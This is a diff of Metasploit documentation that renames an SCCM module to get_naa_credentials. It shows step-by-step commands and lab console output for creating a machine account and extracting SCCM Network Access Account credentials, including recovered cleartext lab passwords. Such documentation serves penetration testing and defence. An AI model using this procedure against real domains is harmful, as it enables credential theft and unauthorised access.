@@ -18,20 +18,20 @@ The `admin/dcerpc/samr_computer` module is generally used to first create a comp
    c. For the `LOOKUP_ACCOUNT` action, set the `ACCOUNT_NAME` option
 4. Run the module and see that a new machine account was added
 
-Then the `auxiliary/admin/sccm/get_naa_creds` module can be used:
+Then the `auxiliary/admin/sccm/get_naa_credentials` module can be used:
 
-1. `use auxiliary/admin/sccm/get_naa_creds`
+1. `use auxiliary/admin/sccm/get_naa_credentials`
 2. Set the `RHOST` value to a target domain controller (if LDAP autodiscovery is used)
 3. Set the `USERNAME` and `PASSWORD` information to a domain account
 4. Set the `COMPUTER_USER` and `COMPUTER_PASSWORD` to the values obtained through the `samr_computer` module
-5. Run the module to obtain the NAA creds, if present.
+5. Run the module to obtain the NAA credentials, if present.
 
 Alternatively, if the Management Point and Site Code are known, the module can be used without autodiscovery:
 
-1. `use auxiliary/admin/sccm/get_naa_creds`
+1. `use auxiliary/admin/sccm/get_naa_credentials`
 2. Set the `COMPUTER_USER` and `COMPUTER_PASSWORD` to the values obtained through the `samr_computer` module
 3. Set the `MANAGEMENT_POINT` and `SITE_CODE` to the known values.
-4. Run the module to obtain the NAA creds, if present.
+4. Run the module to obtain the NAA credentials, if present.
 
 The management point and site code can be retrieved using the `auxiliary/gather/ldap_query` module, using the `ENUM_SCCM_MANAGEMENT_POINTS` action.
 
@@ -68,9 +68,9 @@ msf6 auxiliary(admin/dcerpc/samr_account) > run rhost=192.168.33.10 domain=sccm.
 Using the credentials just obtained with the `samr_account` module.
 
 ```
-msf6 auxiliary(admin/sccm/get_naa_creds) > options
+msf6 auxiliary(admin/sccm/get_naa_credentials) > options
 
-Module options (auxiliary/admin/sccm/get_naa_creds):
+Module options (auxiliary/admin/sccm/get_naa_credentials):
 
    Name              Current Setting  Required  Description
    ----              ---------------  --------  -----------
@@ -101,7 +101,7 @@ Module options (auxiliary/admin/sccm/get_naa_creds):
 
 
 View the full module info with the info, or info -d command.
-msf6 auxiliary(admin/sccm/get_naa_creds) > run rhost=192.168.33.10 username=eve domain=sccm.lab password=iloveyou computer_user=DESKTOP-2KVDWNZ3$ computer_pass=pJTrvFyDHiHnqtlqTTNYe2HPVpO3Yekj
+msf6 auxiliary(admin/sccm/get_naa_credentials) > run rhost=192.168.33.10 username=eve domain=sccm.lab password=iloveyou computer_user=DESKTOP-2KVDWNZ3$ computer_pass=pJTrvFyDHiHnqtlqTTNYe2HPVpO3Yekj
 [*] Running module against 192.168.33.10
 
 [*] Discovering base DN automatically
@@ -110,7 +110,7 @@ msf6 auxiliary(admin/sccm/get_naa_creds) > run rhost=192.168.33.10 username=eve 
 [*] Got SMS ID: BD0DC478-A71A-4348-BD14-B7E91335738E
 [*] Waiting 5 seconds for SCCM DB to update...
 [*] Got NAA Policy URL: http://<mp>/SMS_MP/.sms_pol?{c48754cc-090c-4c56-ba3d-532b5ce5e8a5}.2_00
-[+] Found valid NAA creds: sccm.lab\sccm-naa:123456789
+[+] Found valid NAA credentials: sccm.lab\sccm-naa:123456789
 [*] Auxiliary module execution completed
 ```
 
@@ -133,13 +133,13 @@ CN=SMS-MP-P01-MECM.SCCM.LAB,CN=System Management,CN=System,DC=sccm,DC=lab
 [*] Query returned 1 result.
 [*] Auxiliary module execution completed
 
-msf6 auxiliary(gather/ldap_query) > use auxiliary/admin/sccm/get_naa_creds
+msf6 auxiliary(gather/ldap_query) > use auxiliary/admin/sccm/get_naa_credentials
 
-msf6 auxiliary(admin/sccm/get_naa_creds) > run computer_user=DESKTOP-2KVDWNZ3$ computer_pass=pJTrvFyDHiHnqtlqTTNYe2HPVpO3Yekj management_point=MECM.sccm.lab site_code=P01
+msf6 auxiliary(admin/sccm/get_naa_credentials) > run computer_user=DESKTOP-2KVDWNZ3$ computer_pass=pJTrvFyDHiHnqtlqTTNYe2HPVpO3Yekj management_point=MECM.sccm.lab site_code=P01
 
 [*] Got SMS ID: BD0DC478-A71A-4348-BD14-B7E91335738E
 [*] Waiting 5 seconds for SCCM DB to update...
 [*] Got NAA Policy URL: http://<mp>/SMS_MP/.sms_pol?{c48754cc-090c-4c56-ba3d-532b5ce5e8a5}.2_00
-[+] Found valid NAA creds: sccm.lab\sccm-naa:123456789
+[+] Found valid NAA credentials: sccm.lab\sccm-naa:123456789
 [*] Auxiliary module execution completed
 ```
